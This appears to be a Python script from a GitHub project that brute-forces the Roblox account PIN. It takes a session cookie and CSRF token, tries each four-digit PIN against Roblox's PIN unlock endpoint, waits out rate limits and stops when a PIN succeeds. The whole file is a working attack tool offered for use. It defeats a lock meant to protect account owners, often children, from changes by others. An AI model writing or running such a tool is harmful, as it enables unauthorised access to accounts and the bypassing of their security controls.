import os
import requests
from requests.structures import CaseInsensitiveDict
import time
import sys
print("To find your account's cookie and csrf token,\ncheck the README.md file in Github\nfanks,\nlove by Tangly\n-------------")
cookiepls = input("Enter account's cookie here: ")
csrftoken = input("Enter csrf token here: ")
print("cool lets get this bad boy running now")
def convert(num):
    if num < 10:
        return f"000{num}"
    elif num < 100:
        return f"00{num}"
    elif num < 1000:
        return f"0{num}"
    else:
        return str(num)
def makerequest(pin):
    statustime = f"Tried {pin}"
    hehe = CaseInsensitiveDict()
    hehe["authority"] = "auth.roblox.com"
    hehe["method"] = "POST"
    hehe["path"] = "/v1/account/pin/unlock"
    hehe["scheme"] = "https"
    hehe["accept"] = "application/json, text/plain, */*"
    hehe["accept-encoding"] = "gzip, deflate, br"
    hehe["accept-language"] = "en-US,en;q=0.9"
    hehe["content-length"] = "8"
    hehe["content-type"] = "application/x-www-form-urlencoded"
    hehe["cookie"] = f"{cookiepls}"
    hehe["origin"] = "https://www.roblox.com"
    hehe["referer"] = "https://www.roblox.com/"
    hehe["sec-fetch-dest"] = "empty"
    hehe["sec-fetch-mode"] = "cors"
    hehe["sec-fetch-site"] = "same-site"
    hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
    hehe["x-csrf-token"] = f"{csrftoken}"
    hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
    print(f"\n{statustime}\n---------\nStatus Code: {hi.status_code}\n{hi.content}\nPin: {pin}\n")
    if hi.status_code == 429:
        time.sleep(2)
        statustime = "TOO MANY REQUESTS! Delaying..."
        makerequest(pin)
    elif hi.status_code == 403:
        statustime = f"Tried {pin}"
    elif hi.status_code == 200:
        sys.exit()
for i in range(0,9999):
    time.sleep(2)
    makerequest(convert(i))
    # print(convert(i))
    